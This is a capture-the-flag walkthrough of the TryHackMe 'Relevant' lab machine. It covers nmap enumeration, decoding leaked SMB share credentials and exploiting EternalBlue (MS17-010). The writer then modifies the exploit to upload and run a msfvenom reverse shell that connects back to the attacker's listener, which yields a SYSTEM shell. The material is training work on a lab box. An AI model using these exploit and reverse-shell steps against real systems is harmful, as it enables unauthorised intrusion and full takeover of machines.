# Relevant

URL: https://tryhackme.com/room/relevant

Level: Medium

Start time: 1 February 2022, 11:11pm GMT+1

End time: 3 February 2022, 6:03pm GMT+1

Actual play time: more than I imagined

## Walkthrough

### Enumeration


#### NMAP


Let's start with a basic nmap scan:

```
# Nmap 7.91 scan initiated Tue Feb  1 23:08:22 2022 as: nmap -T4 -p- -oN 01_nmap 10.10.30.6
Nmap scan report for 10.10.30.6
Host is up (0.088s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown

# Nmap done at Tue Feb  1 23:11:33 2022 -- 1 IP address (1 host up) scanned in 191.92 seconds
```

Lots of open ports. Let's check again with service detection (-sV) and default script (-sC):

```
# Nmap 7.91 scan initiated Tue Feb  1 23:12:16 2022 as: nmap -T4 -p80,135,139,445,3389,49663,49667,49669 -sC -sV -oN 02_nmap 10.10.30.6
Nmap scan report for 10.10.30.6
Host is up (0.097s latency).

PORT      STATE SERVICE        VERSION
80/tcp    open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server?
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-02-01T22:13:51+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2022-01-31T22:03:45
|_Not valid after:  2022-08-02T22:03:45
|_ssl-date: 2022-02-01T22:14:31+00:00; -1s from scanner time.
49663/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h35m58s, deviation: 3h34m40s, median: -1s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-02-01T14:13:51-08:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-02-01T22:13:55
|_  start_date: 2022-02-01T22:04:33

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb  1 23:14:32 2022 -- 1 IP address (1 host up) scanned in 136.51 seconds
```

```
# gobuster dir -u http://relevant.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o 04_gobuster
```

Since it took a very long time, we focus on SMB protocol.

```
root@kali:/opt/TryHackMe/relevant# nmap --script smb-enum-shares -p445 10.10.124.106
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-02 21:47 CET
Nmap scan report for relevant.thm (10.10.124.106)
Host is up (0.068s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.124.106\ADMIN$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.124.106\C$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.124.106\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.124.106\nt4wrksv:
|     Type: STYPE_DISKTREE
|     Comment:
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
```

We found a share "nt4wrksv" and we got access to a "passwords.txt" file:

```
root@kali:/opt/TryHackMe/relevant# smbclient //10.10.124.106/nt4wrksv
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Feb  2 21:47:46 2022
  ..                                  D        0  Wed Feb  2 21:47:46 2022
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020

                7735807 blocks of size 4096. 4944225 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> quit
```
We found a couple of base64 credentials:

```
root@kali:/opt/TryHackMe/relevant# cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
root@kali:/opt/TryHackMe/relevant#
root@kali:/opt/TryHackMe/relevant#
root@kali:/opt/TryHackMe/relevant# echo -n "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123
root@kali:/opt/TryHackMe/relevant# echo -n "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```
We run a "vuln" scan against port 445:

```
# Nmap 7.91 scan initiated Wed Feb  2 00:14:14 2022 as: nmap -T4 --script vuln -p445 -oN 07_nmap_vuln 10.10.226.227
..
..
Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Read from /usr/bin/../share/nmap: nmap-payloads nmap-services.
# Nmap done at Wed Feb  2 00:24:41 2022 -- 1 IP address (1 host up) scanned in 627.24 seconds
```

Host is vulnerable to Eternal Blue (MS17-010).

We search proper exploit:

```
root@kali:/opt/tryhackme/relevant# searchsploit eternalblue
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                            | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                        | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                  | windows_x86-64/remote/42030.py
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

We choose 42315.py since we are facing a Windows 2016 Server.

```
# searchsploit -m 42315.py
```

For this exploit it is also required another file, we can grab it from:

https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py

We need to edit exploit with our previous credentials:

```
USERNAME = 'Bob'
PASSWORD = '!P@$$W0rD!123'
```

We try a first run:

```
root@kali:/opt/TryHackMe/relevant# ./42315.py 10.10.130.107
Target OS: Windows Server 2016 Standard Evaluation 14393
Using named pipe: samr
Target is 64 bit
Got frag size: 0x20
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xf90
CONNECTION: 0xffff9c8a6d0dc140
SESSION: 0xffff800dc4799210
FLINK: 0xffff800dc304f048
InParam: 0xffff800dcc1e316c
MID: 0x4103
unexpected alignment, diff: 0x-9194fb8
leak failed... try again
CONNECTION: 0xffff9c8a6d0dc140
SESSION: 0xffff800dc4799210
FLINK: 0xffff800dc304f048
InParam: 0xffff800dcc1dd16c
MID: 0x4103
unexpected alignment, diff: 0x-918efb8
leak failed... try again
CONNECTION: 0xffff9c8a6d0dc140
SESSION: 0xffff800dc4799210
FLINK: 0xffff800dcc1f5098
InParam: 0xffff800dcc1ef16c
MID: 0x4203
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Done
```

It is working fine, since file `c:\pwned.txt` has been created.

Now, our goal is to obtain a reverse shell.

First, we create a reverse shell executable with `msfvenom`:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.147.132 LPORT=4444 -f exe > shell.exe
```

Then we start a netcat listener:

```
nc -nlvp 4444
```

Now we change a little the exploit behavior. We want to execute our `shell.exe` file:

```
..
..
def smb_pwn(conn, arch):
    smbConn = conn.get_smbconnection()
    print('SMB connection OK')
    smb_send_file(smbConn, 'shell.exe', 'C', '/test2.exe')
    print('Shell uploaded')
    service_exec(conn, r'c:\test2.exe')
    print('Run shell!')
..
..
```

We run exploit:

```
# ./exploit.py 10.10.141.137
```

and we obtain a reverse shell:

```
root@kali:/opt/tryhackme/relevant# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.147.132] from (UNKNOWN) [10.10.141.137] 49886
whoami
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```

From there, we can grab user and root flags from "Bob" and "Administrator" desktop.

reference:

https://redteamzone.com/EternalBlue/






